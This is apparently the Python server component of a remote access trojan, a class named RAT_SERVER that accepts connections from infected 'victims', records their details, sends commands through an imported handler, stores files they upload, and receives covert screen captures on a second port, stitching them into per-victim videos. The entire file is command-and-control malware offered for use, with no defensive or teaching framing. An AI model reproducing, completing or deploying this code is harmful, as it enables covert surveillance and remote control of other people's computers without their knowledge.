import socket
from host.handler.command_handler import execute_command
from host.handler import command_importer
import select
import threading
import os
import datetime
import cv2
import io
import struct
import numpy as np
import uuid
import pickle
from PIL import Image


class SingletonMeta(type):
    _instances = {}

    def __call__(cls, *args, **kwargs):
        if cls not in cls._instances:
            instance = super(SingletonMeta, cls).__call__(*args, **kwargs)
            cls._instances[cls] = instance
        return cls._instances[cls]


class RAT_SERVER(metaclass=SingletonMeta):
    instance = None  # Class variable to store the instance

    def __init__(self, host, port):
        if not RAT_SERVER.instance:
            self.host = host
            self.port = port
            self.clients = []  # The connection with the clients

            self.screen_share_clients = []  # The clients that are currently screen sharing
            # Information about the clients but more for information instead of the connection available
            self.victims = []
            RAT_SERVER.instance = self  # Set the instance to this object

    def build_connection(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind((self.host, self.port))
        s.listen(5)
        print("[*] Waiting for clients...")

        while True:
            client, addr = s.accept()
            self.clients.append((client, addr))
            print(f"[*] Connection is established successfully with {addr[0]}")

            output = self.receive_output(client)

            output = output.split("|")
            output_dict = {}
            for item in output:
                item = item.split(":")
                item[1] = item[1].replace("colon", ":")
                output_dict[item[0]] = item[1]

            output_dict["socket_ip"] = addr[0]

            # Generate a new filepath for the video
            randomUUID = str(uuid.uuid4().hex)
            directory = f"data/{output_dict['Name']}/screenshare/{randomUUID}/"

            output_dict["SCREENSHARE_SOURCE"] = f"{directory}video.avi"

            print(
                f"[*] Adding {output_dict['Name']} to the list of victims")

            for victim in self.victims:
                if victim["Name"] == output_dict["Name"]:
                    self.victims.remove(victim)
            self.victims.append(output_dict)

    def receive_output(self, client_socket):
        try:
            print("Receiving output")

            ready = select.select([client_socket], [], [], 5)

            if ready[0]:
                return client_socket.recv(100024).decode()
            else:
                return "Error receiving output"
        except Exception as e:
            print(f"Error receiving output: {str(e)}")

    def handle_client(self, client_socket):
        while True:
            try:
                command = client_socket.recv(1024).decode()
                if not command:
                    break
                output = self.execute(command, client_socket)
                if output is not None:
                    client_socket.send(output.encode())
            except Exception as e:
                print(f"Error handling client: {str(e)}")
                break

        client_socket.close()

    def execute(self, command_type, command, client_socket):
        # Execute the command
        try:
            execute_command(self, command_type, command, client_socket)
        except Exception as e:
            output = str(e)
            print(f"Error executing command: {output}")
            return output

    def upload_file(self, file, client_socket):
        # Save the file

        # Make the directory if it doesn't exist
        # directory should be data/<client_name>/images/<filename>
        directory = f"data/{client_socket.getpeername()[0]}/images/"
        if not os.path.exists(directory):
            os.makedirs(directory)

        filename = file.filename
        filepath = directory + filename

        with open(filepath, "wb") as f:
            f.write(file.file.read())

        print(f"[*] File saved to {filepath}")

    def build_screenshare_connection(self):
        # Start the socket connection
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind((self.host, 8090))
        s.listen(5)
        # self.connection = s.accept()[0].makefile('rb')
        print("[*] Waiting for screenshare clients...")

        while True:
            client, addr = s.accept()
            if addr in self.screen_share_clients:
                continue

            self.screen_share_clients.append((client, addr))
            print(
                f"\n[*] Connection is established successfully with {addr[0]}")

            # Use the screenshare_clients list to get the index of the client
            # Then use that index to get the victim
            # Then use the victim to get the name

            # Get the victim
            victim = None
            for victim in self.victims:
                if victim["socket_ip"] == addr[0]:
                    break

            print("[*] Starting new thread to handle screenshare client\n")
            # Start a new thread to handle the client
            t = threading.Thread(
                target=self.handle_screenshare_client, args=(client,))
            t.start()

    def handle_screenshare_client(self, screenshare_socket):
        # Will handle the client, this is used when we are listenening for a clietns screenshare connection.
        # We will turn the images into a video.
        # Then make the video accessable from another python file, which will
        # send it to the web
        print("[*] Handling screenshare client" + str(screenshare_socket))

        # Make the directory if it doesn't exist
        # Find the victim using the screenshare_socket
        victim = None
        for victim in self.victims:
            if victim["socket_ip"] == screenshare_socket.getpeername()[0]:
                break

        # directory should be data/<client_name>/screenshare/<date>
        directory = victim['SCREENSHARE_SOURCE'].replace("video.avi", "")
        if not os.path.exists(directory):
            os.makedirs(directory)

        frames = []
        count = 0  # For testing mesoures
        out = None
        while True:
            try:
                if (count == 10000):
                    break
                count += 1
                # Get the image
                img = self.get_screenshot(screenshare_socket)

                

                # Turn the image into a frame
                frame = np.array(Image.open(io.BytesIO(img)))

                # Add the frame to the frames list
                frames.append(frame)

                # If the out is None, initialize it
                if out is None:
                    # Get the height and width of the frame
                    height, width, layers = frame.shape
                    size = (width, height)

                    # Make the video
                    out = cv2.VideoWriter(
                        f"{directory}video.avi", cv2.VideoWriter_fourcc(*'DIVX'), 15, size)

            except Exception as e:
                print(f"Error getting image: {str(e)}")
                break

        if out is not None:
            for frame in frames:
                out.write(frame)

            out.release()
            cv2.destroyAllWindows()
        print("[*] Directory Saved at " + directory)

        # Store the video path in the victims dict
        for victim in self.victims:
            # if victim["IP"] == screenshare_socket.getpeername()[0]:
            victim["Video"] = f"{directory}video.avi"
            break

    def get_screenshot(self, client_socket):
        try:

            chunk = client_socket.recv(400096)
            if not chunk:
                return None

            # Get the image
            img = chunk

            # Write a example image
            file = open("image.png", "wb")
            file.write(img)
            return img

        except Exception as e:
            print(f"Error getting image: {str(e)}")
        return None
